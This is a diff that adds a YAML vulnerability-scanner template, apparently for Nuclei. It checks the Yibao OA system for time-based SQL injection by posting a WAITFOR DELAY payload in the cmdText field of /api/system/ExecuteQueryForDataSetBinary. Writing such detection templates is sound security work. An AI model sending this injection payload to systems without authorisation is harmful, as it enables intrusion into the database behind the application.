@@ -1,0 +1,50 @@
+id: poc-yaml-yi-bao-oa-system-executequeryfordatasetbinary-sqli
+info:
+  name: 易宝OA系统 ExecuteQueryForDataSetBinary SQL注入漏洞
+  author: ProjectDiscoveryAI
+  severity: high
+  tags: sql-injection
+  description: |
+    易宝OA系统存在SQL注入漏洞，通过向/api/system/ExecuteQueryForDataSetBinary发送特定的payload，可以触发延时响应。
+variables:
+  t1: "{{rand_int(5, 10)}}"
+  t2: "{{to_number(t1) + 2}}"
+
+http:
+  - raw:
+      - |
+        GET / HTTP/1.1
+        Host: {{Hostname}}
+
+    matchers-condition: and
+    matchers:
+      - type: word
+        part: body
+        words:
+          - "欢迎登录易宝OA系统"
+      - type: status
+        status:
+          - 200
+
+  - raw:
+      - |
+        POST /api/system/ExecuteQueryForDataSetBinary HTTP/1.1
+        Host: {{Hostname}}
+        Content-Type: application/x-www-form-urlencoded
+
+        token=zxh&cmdText=;WAITFOR DELAY '0:0:{{t1}}'--+
+    matchers-condition: and
+    matchers:
+      - type: word
+        part: body
+        words:
+          - "\"message\":\"success\""
+          - "\"is_succeed\":true"
+      - type: word
+        part: header
+        words:
+          - "application/json"
+      - type: dsl
+        dsl:
+          - duration > to_number(t1)
+          - duration < to_number(t2)
